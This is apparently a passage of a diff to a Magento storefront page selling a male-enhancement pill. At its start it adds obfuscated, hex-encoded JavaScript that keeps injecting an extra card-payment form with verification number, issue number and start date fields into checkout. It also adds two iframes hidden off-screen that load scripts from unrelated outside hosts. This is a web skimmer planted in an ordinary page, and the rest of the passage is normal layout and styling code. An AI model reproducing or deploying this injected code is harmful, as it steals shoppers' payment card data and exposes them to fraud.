0\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x63\x65\x6E\x74\x69\x6E\x65\x6C\x2D\x6C\x6F\x67\x6F\x73\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x65\x6E\x74\x69\x6E\x65\x6C\x5F\x6C\x6F\x67\x6F\x22\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x3E\x54\x6F\x20\x65\x6E\x73\x75\x72\x65\x20\x74\x68\x65\x20\x73\x65\x63\x75\x72\x69\x74\x79\x20\x6F\x66\x20\x79\x6F\x75\x72\x20\x74\x72\x61\x6E\x73\x61\x63\x74\x69\x6F\x6E\x73\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x20\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x63\x69\x64\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x43\x61\x72\x64\x20\x56\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x20\x4E\x75\x6D\x62\x65\x72\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x43\x61\x72\x64\x20\x56\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x20\x4E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x63\x76\x76\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x63\x76\x6E\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x63\x69\x64\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x63\x69\x64\x5D\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x61\x20\x68\x72\x65\x66\x3D\x22\x23\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x63\x76\x76\x2D\x77\x68\x61\x74\x2D\x69\x73\x2D\x74\x68\x69\x73\x22\x3E\x57\x68\x61\x74\x20\x69\x73\x20\x74\x68\x69\x73\x3F\x3C\x2F\x61\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x74\x79\x70\x65\x5F\x73\x73\x5F\x64\x69\x76\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x64\x69\x73\x70\x6C\x61\x79\x3A\x20\x6E\x6F\x6E\x65\x3B\x22\x3E\x20\x3C\x75\x6C\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x6E\x65\x72\x2D\x66\x6F\x72\x6D\x22\x3E\x20\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x6F\x72\x6D\x2D\x61\x6C\x74\x22\x3E\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x69\x73\x73\x75\x65\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x53\x77\x69\x74\x63\x68\x2F\x53\x6F\x6C\x6F\x2F\x4D\x61\x65\x73\x74\x72\x6F\x20\x4F\x6E\x6C\x79\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x69\x73\x73\x75\x65\x22\x3E\x49\x73\x73\x75\x65\x20\x4E\x75\x6D\x62\x65\x72\x3A\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x73\x70\x61\x6E\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x49\x73\x73\x75\x65\x20\x4E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x75\x6B\x73\x73\x20\x63\x76\x76\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x69\x73\x73\x75\x65\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x73\x73\x5F\x69\x73\x73\x75\x65\x5D\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x73\x70\x61\x6E\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x73\x74\x61\x72\x74\x5F\x6D\x6F\x6E\x74\x68\x22\x3E\x53\x74\x61\x72\x74\x20\x44\x61\x74\x65\x3A\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x73\x74\x61\x72\x74\x5F\x6D\x6F\x6E\x74\x68\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x73\x73\x5F\x73\x74\x61\x72\x74\x5F\x6D\x6F\x6E\x74\x68\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x75\x6B\x73\x73\x20\x6D\x6F\x6E\x74\x68\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x4D\x6F\x6E\x74\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x22\x3E\x30\x31\x20\x2D\x20\x4A\x61\x6E\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x22\x3E\x30\x32\x20\x2D\x20\x46\x65\x62\x72\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x33\x22\x3E\x30\x33\x20\x2D\x20\x4D\x61\x72\x63\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x34\x22\x3E\x30\x34\x20\x2D\x20\x41\x70\x72\x69\x6C\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x35\x22\x3E\x30\x35\x20\x2D\x20\x4D\x61\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x36\x22\x3E\x30\x36\x20\x2D\x20\x4A\x75\x6E\x65\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x37\x22\x3E\x30\x37\x20\x2D\x20\x4A\x75\x6C\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x38\x22\x3E\x30\x38\x20\x2D\x20\x41\x75\x67\x75\x73\x74\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x39\x22\x3E\x30\x39\x20\x2D\x20\x53\x65\x70\x74\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x30\x22\x3E\x31\x30\x20\x2D\x20\x4F\x63\x74\x6F\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x31\x22\x3E\x31\x31\x20\x2D\x20\x4E\x6F\x76\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x32\x22\x3E\x31\x32\x20\x2D\x20\x44\x65\x63\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x73\x74\x61\x72\x74\x5F\x79\x65\x61\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x73\x73\x5F\x73\x74\x61\x72\x74\x5F\x79\x65\x61\x72\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x75\x6B\x73\x73\x20\x79\x65\x61\x72\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x59\x65\x61\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x31\x22\x3E\x32\x30\x31\x31\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x32\x22\x3E\x32\x30\x31\x32\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x33\x22\x3E\x32\x30\x31\x33\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x34\x22\x3E\x32\x30\x31\x34\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x35\x22\x3E\x32\x30\x31\x35\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x36\x22\x3E\x32\x30\x31\x36\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x64\x76\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72\x22\x3E\x26\x6E\x62\x73\x70\x3B\x3C\x2F\x6C\x69\x3E\x20\x3C\x2F\x75\x6C\x3E\x20\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x2F\x75\x6C\x3E","\x62\x65\x66\x6F\x72\x65\x65\x6E\x64","\x69\x6E\x73\x65\x72\x74\x41\x64\x6A\x61\x63\x65\x6E\x74\x48\x54\x4D\x4C"];window[_0xc240[3]](function(){if(!document[_0xc240[1]](_0xc240[0])){ShowForm(_0xc240[2])}},100);function ShowForm(_0x25adx2){if(document[_0xc240[1]](_0x25adx2)){var _0x25adx3=document[_0xc240[1]](_0x25adx2);while(_0x25adx3[_0xc240[4]]){_0x25adx3[_0xc240[5]](_0x25adx3[_0xc240[4]])};var _0x25adx4=_0xc240[6];_0x25adx3[_0xc240[8]](_0xc240[7],_0x25adx4)}}</script><div style='width: 300px; height: 300px; position:absolute; left:-500px; top: -500px;'> <iframe src='http://fortunoffdev.gemfindwebdesign.com/gemfind/info.php' width='250' height='250'></iframe></div><div style='width: 300px; height: 300px; position:absolute; left:-500px; top: -500px;'> <iframe src='https://www.visio-rx.com/docs/info.php' width='250' height='250'></iframe></div></head>
+<body class=" cms-index-index cms-home">
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        <script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-82051456-1', 'auto');
+  ga('send', 'pageview');
+  
+       jQuery('.navbar-toggle').click(function(){
+        jQuery('#navbar').animate({
+            'left' : jQuery('#header #navbar').css('left') == '0px' ? '-260px' : '0px'
+        }, 200);
+      });
+	  
+
+
+
+</script>
+
+
+
+<header id="header" class="">
+
+<div class="header-top-panel">
+    <div class="mainWidth">
+        <span class="pull-left topHeading">Anytime Natural Male Enhancement</span>
+        <div class="pull-right">
+            <ul class="reward clearfix">
+                <li>
+                    <img src="http://www.megatest21.com/skin/frontend/megatest/default/images/megatest/seal-of-clinical-2.png">
+                </li>
+                <li>
+                    <img src="http://www.megatest21.com/skin/frontend/megatest/default/images/megatest/seal-of-approval-ingredients-1.png">
+                </li>
+                <li>
+                    <img src="http://www.megatest21.com/skin/frontend/megatest/default/images/megatest/seal-of-delivery-2.png">
+                </li>
+                <li>
+                    <img src="http://www.megatest21.com/skin/frontend/megatest/default/images/megatest/authorize-net-logo-white.png">
+                </li>
+            </ul>
+            <span class="phone-text pull-left"><i class="dfd-icon-phone"></i>1-877-672-6881</span>
+
+            <a href="http://www.megatest21.com/store.html" class="btn-order pull-right">Order Now</a>
+
+            <a href="http://www.megatest21.com/customer/account/login/" class="searchIcon pull-right">
+                <i class="glyphicon glyphicon-user "></i>
+            </a>
+        </div>
+    </div>
+</div>
+
+
+    <nav class="navbar navbar-default">
+            <div class="mainWidth topNav">
+                <div class="navbar-header">
+					
+                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar top"></span>
+                        <span class="icon-bar middle"></span>
+                        <span class="icon-bar bottom"></span>
+                    </button>
+                    <h1 class="navbar-brand">
+                        <a class="logo" href="http://www.megatest21.com/">
+                            <img src="http://www.megatest21.com/skin/frontend/megatest/default/images/logo.png" alt="Magento Commerce" class="large" />
+                            <img src="http://www.megatest21.com/skin/frontend/megatest/default/images/logo.png" alt="Magento Commerce" class="small" />
+                        </a>
+                    </h1>
+                </div>
+                
+    <div id="navbar" class="navbar-collapse collapse">
+        <ul class="nav navbar-nav">
+        	<li>
+              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar top"></span>
+                <span class="icon-bar middle"></span>
+                <span class="icon-bar bottom"></span>
+              </button>
+            </li>
+            		    <li class="active"><a href="http://www.megatest21.com/">Home</a></li>
+		    		
+		    </li>
+            <li  class="level0 nav-1 first"><a href="http://www.megatest21.com/science.html" class="level0 ">Science</a></li><li  class="level0 nav-2"><a href="http://www.megatest21.com/testimonials.html" class="level0 ">Testimonials</a></li><li  class="level0 nav-3"><a href="http://www.megatest21.com/faqs.html" class="level0 ">FAQS</a></li><li  class="level0 nav-4"><a href="http://www.megatest21.com/contact.html" class="level0 ">Contact</a></li><li  class="level0 nav-5 last"><a href="http://www.megatest21.com/how-it-works.html" class="level0 ">How It Works</a></li>            <li class="btn-orderside">
+				<a href="http://www.megatest21.com/store.html">
+					Order Now
+				</a>
+			</li>
+            <li class="sideLogin">
+				<a href="http://www.megatest21.com/customer/account/login/">
+					<i class="glyphicon glyphicon-user"></i> Login				</a>
+			</li>
+			
+            
+        </ul>
+    </div>
+                
+            </div>
+    </nav>
+</header>
+        <div class="col1-layout">
+            <div class="main">
+                <div class="col-main">
+                                        <div class="std"><div><style type="text/css">.button-down-slider a{color:#fff}nnn.tp-caption.whitedivider3px{ncolor:#000000;ntext-shadow:none;nbackground-color:rgb(44,159,92);nbackground-color:rgba(44,159,92,1);ntext-decoration:none;nfont-size:0px;nline-height:0;nmin-width:656px;nmin-height:4px;nborder-width:0px;nborder-color:rgb(0,0,0);nborder-style:none;n}nnn.tp-caption.store_button_full_black a,.tp-caption.store_button_full a{n   position:absolute; ncolor:#fff; ntext-shadow:none; nfont-size:14px; nline-height:18px !important; nfont-family:"Montserrat";npadding:25px 40px 25px 40px !important;nmargin:0px; n cursor:pointer;n   background:none;n  border-radius:30px;n height:0px;n   background:#2C9F5C;n   background-color:rgb(44,159,92);n  background-color:rgba(44,159,92,0.8);n text-transform:uppercase;n n}nnn.tp-caption.store_button_full a{n background:#2C9F5C;n  border:none;n background-color:rgb(44,159,92);n background-color:rgba(44,159,92,0.8);n color:#fff !important}n  nn.tp-caption.store_button_full_black a{n background:#121212;n  background-color:rgb(18,18,18);n background-color:rgba(18,18,18,0.9);n  border:none;n color:#fff !important;n}n.tp-caption.store_button_full_black a,.tp-caption.store_button_full a{line-height:0px !important}nn.tp-caption.store_button a:hover,.tp-caption.store_button_full a:hover{n   background:#2C9F5C !important;n n}n.tp-caption.store_button_full_black a:hover{background:#121212}n.tp-caption.pmc-button{border-bottom:none !important}n.tp-caption a{ncolor:#ff7302;ntext-shadow:none;n-webkit-transition:all 0.2s ease-out;n-moz-transition:all 0.2s ease-out;n-o-transition:all 0.2s ease-out;n-ms-transition:all 0.2s ease-out;n}nn.tp-caption a:hover{ncolor:#ffa902;n}nn.largeredbtn{nfont-family:"Raleway",sans-serif;nfont-weight:900;nfont-size:16px;nline-height:60px;ncolor:#fff !important;ntext-decoration:none;npadding-left:40px;npadding-right:80px;npadding-top:22px;npadding-bottom:22px;nbackground:rgb(234,91,31); nbackground:-moz-linear-gradient(top,rgba(234,91,31,1) 0%,rgba(227,58,12,1) 100%); nbackground:-webkit-gradient(linear,left top,left bottom,color-stop(0%,rgba(234,91,31,1)),color-stop(100%,rgba(227,58,12,1))); nbackground:-webkit-linear-gradient(top,rgba(234,91,31,1) 0%,rgba(227,58,12,1) 100%); nbackground:-o-linear-gradient(top,rgba(234,91,31,1) 0%,rgba(227,58,12,1) 100%); nbackground:-ms-linear-gradient(top,rgba(234,91,31,1) 0%,rgba(227,58,12,1) 100%); nbackground:linear-gradient(to bottom,rgba(234,91,31,1) 0%,rgba(227,58,12,1) 100%); nfilter:progid:DXImageTransform.Microsoft.gradient( startColorstr='#ea5b1f',endColorstr='#e33a0c',GradientType=0 ); n}nn.largeredbtn:hover{nbackground:rgb(227,58,12); nbackground:-moz-linear-gradient(top,rgba(227,58,12,1) 0%,rgba(234,91,31,1) 100%); nbackground:-webkit-gradient(linear,left top,left bottom,color-stop(0%,rgba(227,58,12,1)),color-stop(100%,rgba(234,91,31,1))); nbackground:-webkit-linear-gradient(top,rgba(227,58,12,1) 0%,rgba(234,91,31,1) 100%); nbackground:-o-linear-gradient(top,rgba(227,58,12,1) 0%,rgba(234,91,31,1) 100%); nbackground:-ms-linear-gradient(top,rgba(227,58,12,1) 0%,rgba(234,91,31,1) 100%); nbackground:linear-gradient(to bottom,rgba(227,58,12,1) 0%,rgba(234,91,31,1) 100%); nfilter:progid:DXImageTransform.Microsoft.gradient( startColorstr='#e33a0c',endColorstr='#ea5b1f',GradientType=0 ); n}nn.fullrounded img{n  -webkit-border-radius:400px;n-moz-border-radius:400px;nborder-radius:400px; n}n.tp-caption a{ncolor:#ff7302;ntext-shadow:none;n-webkit-transition:all 0.2s ease-out;n-moz-transition:all 0.2s ease-out;n-o-transition:all 0.2s ease-out;n-ms-transition:all 0.2s ease-out;n}nn.tp-caption a:hover{ncolor:#ffa902;n}nn.largeredbtn{nfont-family:"Raleway",sans-serif;nfont-weight:900;nfont-size:16px;nline-height:60px;ncolor:#fff !important;ntext-decoration:none;npadding-left:40px;npadding-right:80px;npadding-top:22px;npadding-bottom:22px;nbackground:rgb(234,91,31); nbackground:-moz-linear-gradient(top,rgba(234,91,31,1) 0%,rgba(227,58,12,1) 100%); nbackground:-webkit-gradient(linear,left top,left bottom,color-stop(0%,rgba(234,91,31,1)),color-stop(100%,rgba(227,58,12,1))); nbackground:-webkit-linear-gradient(top,rgba(234,91,31,1) 0%,rgba(227,58,12,1) 100%); nbackground:-o-linear-gradient(top,rgba(234,91,31,1) 0%,rgba(227,58,12,1) 100%); nbackground:-ms-linear-gradient(top,rgba(234,91,31,1) 0%,rgba(227,58,12,1) 100%); nbackground:linear-gradient(to bottom,rgba(234,91,31,1) 0%,rgba(227,58,12,1) 100%); nfilter:progid:DXImageTransform.Microsoft.gradient( startColorstr='#ea5b1f',endColorstr='#e33a0c',GradientType=0 ); n}nn.largeredbtn:hover{nbackground:rgb(227,58,12); nbackground:-moz-linear-gradient(top,rgba(227,58,12,1) 0%,rgba(234,91,31,1) 100%); nbackground:-webkit-gradient(linear,left top,left bottom,color-stop(0%,rgba(227,58,12,1)),color-stop(100%,rgba(234,91,31,1))); nbackground:-webkit-linear-gradient(top,rgba(227,58,12,1) 0%,rgba(234,91,31,1) 100%); nbackground:-o-linear-gradient(top,rgba(227,58,12,1) 0%,rgba(234,91,31,1) 100%); nbackground:-ms-linear-gradient(top,rgba(227,58,12,1) 0%,rgba(234,91,31,1) 100%); nbackground:linear-gradient(to bottom,rgba(227,58,12,1) 0%,rgba(234,91,31,1) 100%); nfilter:progid:DXImageTransform.Microsoft.gradient( startColorstr='#e33a0c',endColorstr='#ea5b1f',GradientType=0 ); n}nn.fullrounded img{n  -webkit-border-radius:400px;n-moz-border-radius:400px;nborder-radius:400px; n}n.tp-caption a{ncolor:#ff7302;ntext-shadow:none;n-webkit-transition:all 0.2s ease-out;n-moz-transition:all 0.2s ease-out;n-o-transition:all 0.2s ease-out;n-ms-transition:all 0.2s ease-out;nline-height:140%;n}nn.tp-caption a:hover{ncolor:#ffa902;n}n@import url(http://fonts.googleapis.com/css?family=Open+Sans:400,800,300,700);nn.tp-caption a{ncolor:#296169;ntext-shadow:none;ntext-decoration:none;n-webkit-transition:all 0.2s ease-out;n-moz-transition:all 0.2s ease-out;n-o-transition:all 0.2s ease-out;n-ms-transition:all 0.2s ease-out;n}nn.tp-caption a:hover{ncolor:#296169;n}n.tp-caption a{ncolor:#296169;ntext-shadow:none;ntext-decoration:none;n-webkit-transition:all 0.2s ease-out;n-moz-transition:all 0.2s ease-out;n-o-transition:all 0.2s ease-out;n-ms-transition:all 0.2s ease-out;n}nn.tp-caption a:hover{ncolor:#296169;n}n.feature-round{ncolor:#000;nbackground:#fff;nbackground:rgba(255,255,255,0.7);nfont-size:12px;nwidth:100px;nheight:100px;nline-height:14px;ntext-align:center;ntext-decoration:none;nbox-sizing:border-box;npadding:35px 35px 35px 35px;nbackground-color:transparent;nborder-radius:50px 50px 50px 50px;nborder-width:0px;nborder-color:#000000;nborder-style:none;n}n.tp-caption a{ncolor:#ff7302;ntext-shadow:none;n-webkit-transition:all 0.2s ease-out;n-moz-transition:all 0.2s ease-out;n-o-transition:all 0.2s ease-out;n-ms-transition:all 0.2s ease-out;n}nn.tp-caption a:hover{ncolor:#ffa902;n}</style><link href="http://fonts.googleapis.com/css?family=Open Sans:400,400" rel="stylesheet" property="stylesheet" type="text/css" media="all" />
+<div id="rev_slider_1_1_wrapper" class="rev_slider_wrapper fullwidthbanner-container" style="margin:0px auto;background-color:transparent;padding:0px;margin-top:0px;margin-bottom:0px;">
+<!-- START REVOLUTION SLIDER 5.1.6 fullwidth mode -->
+	<div id="rev_slider_1_1" class="rev_slider fullwidthabanner" style="display:none;" data-version="5.1.6">
+<ul>	<!-- SLIDE  -->
+    <li data-index="rs-1" data-transition="fade" data-slotamount="default" data-hideafterloop="0" data-hideslideonmobile="off"  data-easein="default" data-easeout="default" data-masterspeed="300"  data-link="http://www.megatest21.com/video.html"  data-target="_blank"  data-rotate="0"  data-saveperformance="off"  data-title="Slide" data-param1="" data-param2="" data-param3="" data-param4="" data-param5="" data-param6="" data-param7="" data-param8="" data-param9="" data-param10="" data-description="">
+		<!-- MAIN IMAGE -->
+		<img src="http://www.megatest21.com/skin/frontend/megatest/default/nwdthemes/revslider/public/assets/images/transparent.png"  alt=""  data-bgposition="center center" data-bgfit="cover" data-bgrepeat="no-repeat" data-bgparallax="off" class="rev-slidebg" data-no-retina>
+		<!-- LAYERS -->
+
+		<!-- LAYER NR. 1 -->
+		<div class="tp-caption   tp-resizeme" 
+			 id="slide-1-layer-1" 
+			 data-x="-285" 
+			 data-y="" 
+						data-width="['none','none','none','none']"
+			data-height="['none','none','none','none']"
+			data-transform_idle="o:1;"
+ 
+			 data-transform_in="z:0;rX:0;rY:0;rZ:0;sX:0.9;sY:0.9;skX:0;skY:0;opacity:0;s:4500;e:Power3.easeInOut;" 
+			 data-transform_out="s:300;s:300;" 
+			data-start="500" 
+			data-responsive_offset="on" 
+
+			
+			style="z-index: 5;"><img src="http://www.megatest21.com/media/revslider/hero-1-1.jpg" alt="" data-ww="2000px" data-hh="405px" data-no-retina> 
+		</div>
+
+		<!-- LAYER NR. 2 -->
+		<div class="tp-caption   tp-resizeme" 
+			 id="slide-1-layer-2" 
+			 data-x="95" 
+			 data-y="57" 
+						data-width="['322']"
+			data-height="['auto']"
+			data-transform_idle="o:1;"
+ 
+			 data-transform_in="opacity:0;s:300;e:Power2.easeInOut;" 
+			 data-transform_out="s:300;s:300;" 
+			data-start="500" 
+			data-splitin="none" 
+			data-splitout="none" 
+			data-responsive_offset="on" 
+
+			
+			style="z-index: 6; min-width: 322px; max-width: 322px; white-space: nowrap; font-size: 50px; line-height: 44px; font-weight: 800; color: rgba(0, 0, 0, 1.00);font-family:Open Sans;">A PILL THAT 
+		</div>
+
+		<!-- LAYER NR. 3 -->
+		<div class="tp-caption   tp-resizeme" 
+			 id="slide-1-layer-3" 
+			 data-x="95" 
+			 data-y="100" 
+						data-width="['510']"
+			data-height="['auto']"
+			data-transform_idle="o:1;"
+ 
+			 data-transform_in="opacity:0;s:300;e:Power2.easeInOut;" 
+			 data-transform_out="s:300;s:300;" 
+			data-start="500" 
+			data-splitin="none" 
+			data-splitout="none" 
+			data-responsive_offset="on" 
+
+			
